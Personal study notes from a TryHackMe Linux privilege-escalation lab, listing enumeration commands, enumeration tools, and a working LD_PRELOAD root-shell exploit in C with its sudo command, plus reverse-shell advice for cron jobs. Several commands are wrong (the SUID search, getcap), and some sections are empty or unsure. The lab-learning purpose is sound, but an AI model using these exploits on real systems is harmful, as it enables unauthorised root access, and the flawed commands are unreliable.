

https://tryhackme.com/r/room/linprivesc

####  Enumeration

Get information on installed processes
```
/proc/version
```

To find information on the operating system
```
/etc/issue
```

List out active processes 
```
ps -a 
```

List out env variables
```
env
```

Check which sudo commands a user can run
```
sudo -l 
```

Check the configured routes 
```
ip route
```

#### Automated Enumeration Tools

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


#### Exploits


####  Sudo

**Leverage LD_PRELOAD**

After running the sudo -l command there might be a configuration which allows loading a program before executing a sudo command. 
In this case a shared library file 
I'm unsure about the specifics but shared libraries are used to be called by other kernel programs. 
A sudo shell is launched before the actual command is ran. 


```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

shell.so
```
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

For example is the command a user is allowed to run as root is the "find" command. 
```
sudo LD_PRELOAD=/path/to/shell.so find
```


####  SUID

SUID allows a file or folder to be executed as the owner or group
For instance if a file is owned by Jordan with a SUID, Dan can run the command. 

To list files with the SUID or SGID bit set. 
```
find / -type f -perm 0400 -ls 2>/dev/bnull
```


#### Capabilities

Capabilities is a command to allow a system admin to granular control over how a process is executed and by whom. 

To list enabled capabilities
```
getcap -r 2>/dev/null
```

#### Cron Jobs

Check cron jobs to see if any  are running as a different user to elevate privileges.
```
cat /etc/crontab
```

It's best to configure any script to run a reverse shell to the attacking machine. 
A listener socket will need to be setup on the attackers machines to accept the connection from the victim machine. 



#### Path 

By confirming if 
```

```

#### NFS

